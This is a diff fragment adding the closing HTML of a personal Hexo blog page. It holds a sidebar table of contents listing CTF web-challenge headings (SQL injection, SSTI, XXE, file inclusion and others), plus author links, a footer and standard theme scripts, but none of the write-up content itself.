+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web1"><span class="nav-number">1.</span> <span class="nav-text">Web1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-My-Hidden-Profile"><span class="nav-number">1.1.</span> <span class="nav-text">[问题 1&#x2F;信息收集] My_Hidden_Profile</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA"><span class="nav-number">1.1.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-2-%E6%8A%93%E5%8C%85%E6%94%B9%E5%90%8D-HyperNode"><span class="nav-number">1.2.</span> <span class="nav-text">[问题 2&#x2F;抓包改名] HyperNode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-3-nc-%E9%81%8D%E5%8E%86%E8%B7%AF%E7%94%B1-Static-Secret"><span class="nav-number">1.3.</span> <span class="nav-text">[问题 3&#x2F;nc 遍历路由] Static_Secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-4-git-%E6%B3%84%E9%9C%B2-Dev%E2%80%99s-Regret"><span class="nav-number">1.4.</span> <span class="nav-text">[问题 4&#x2F;git 泄露] Dev’s Regret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-5-SQL-%E6%B3%A8%E5%85%A5-EZSQL"><span class="nav-number">1.5.</span> <span class="nav-text">[问题 5&#x2F;SQL 注入] EZSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-6-NoSQL-%E6%B3%A8%E5%85%A5-NoSQL-Login"><span class="nav-number">1.6.</span> <span class="nav-text">[问题 6&#x2F;NoSQL 注入] NoSQL_Login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-7-%E8%A7%82%E5%AF%9F-cookie-CORS"><span class="nav-number">1.7.</span> <span class="nav-text">[问题 7&#x2F;观察 cookie] CORS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-3"><span class="nav-number">1.7.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web2"><span class="nav-number">2.</span> <span class="nav-text">Web2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-1-%E5%9F%BA%E7%A1%80-SSTI-Hello-User"><span class="nav-number">2.1.</span> <span class="nav-text">[问题 1&#x2F;基础 SSTI] Hello User</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-2-%E5%9F%BA%E7%A1%80-XXE-RSS-Parser"><span class="nav-number">2.2.</span> <span class="nav-text">[问题 2&#x2F;基础 XXE] RSS_Parser</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-4"><span class="nav-number">2.2.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-3-Tomcat-%E6%BC%8F%E6%B4%9E-Forgotten-Tomcat"><span class="nav-number">2.3.</span> <span class="nav-text">[问题 3&#x2F;Tomcat 漏洞] Forgotten_Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-5"><span class="nav-number">2.3.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-4-RCE-%E6%89%AB%E7%9B%98-Server-Monitor"><span class="nav-number">2.4.</span> <span class="nav-text">[问题 4&#x2F;RCE&#x2F;扫盘] Server_Monitor</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-6"><span class="nav-number">2.4.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-5-POP-%E9%93%BE-Magic-Methods"><span class="nav-number">2.5.</span> <span class="nav-text">[问题 5&#x2F;POP 链] Magic_Methods</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-6-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1-LookLook"><span class="nav-number">2.6.</span> <span class="nav-text">[问题 6&#x2F;源码审计] LookLook</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-7"><span class="nav-number">2.6.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-7-%E5%9F%BA%E7%A1%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-Nexus"><span class="nav-number">2.7.</span> <span class="nav-text">[问题 7&#x2F;基础文件包含] Nexus</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-8"><span class="nav-number">2.7.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98-8-dirsearch-%E6%89%AB%E7%9B%98-nebula-cloud"><span class="nav-number">2.8.</span> <span class="nav-text">[问题 8&#x2F;dirsearch 扫盘] nebula_cloud</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">legend1440</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="http://hnu-legend1440.com/" title="---联系方式--- → http:&#x2F;&#x2F;hnu-legend1440.com"><i class="fa fa-house-signal fa-fw"></i>---联系方式---</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://qm.qq.com/q/15T8HZQOFK" title="杨桃监狱Minecraft服务器 → https:&#x2F;&#x2F;qm.qq.com&#x2F;q&#x2F;15T8HZQOFK" rel="noopener" target="_blank"><i class="far fa-house-signal fa-fw"></i>杨桃监狱Minecraft服务器</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://hnu-legend1440.com/" title="个人QQ:1535548287 → http:&#x2F;&#x2F;hnu-legend1440.com"><i class="fab fa-qq fa-fw"></i>个人QQ:1535548287</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/652601966?spm_id_from=333.788.0.0" title="BiliBili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;652601966?spm_id_from&#x3D;333.788.0.0" rel="noopener" target="_blank"><i class="fa fa-play fa-fw"></i>BiliBili</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Sun Jan 18 2026 08:00:00 GMT+0800 (GMT+08:00) – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">legend1440</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
